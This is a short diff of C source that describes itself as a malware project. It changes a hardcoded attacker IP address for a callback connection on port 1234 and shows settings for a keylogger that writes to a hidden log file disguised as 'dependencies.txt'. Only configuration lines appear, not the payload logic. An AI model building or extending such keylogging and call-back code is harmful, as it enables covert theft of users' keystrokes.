@@ -39,7 +39,7 @@ it is not a fully featured Malware product.
 
 
 /*------------------------- THESE ARE THE THINGS WE CAN CHANGE ---------------------------------*/
-# define CLIENT_IP (char*)"172.16.42.122" //our Attackers IP
+# define CLIENT_IP (char*)"172.16.42.171" //our Attackers IP
 # define CLIENT_PORT (int)1234 //Our listening port
 # define LOG_FILE "dependencies.txt" //The name of the log file for the keylogger & it's location
 //Note* by default, the log file is made with the windows hidden attribute
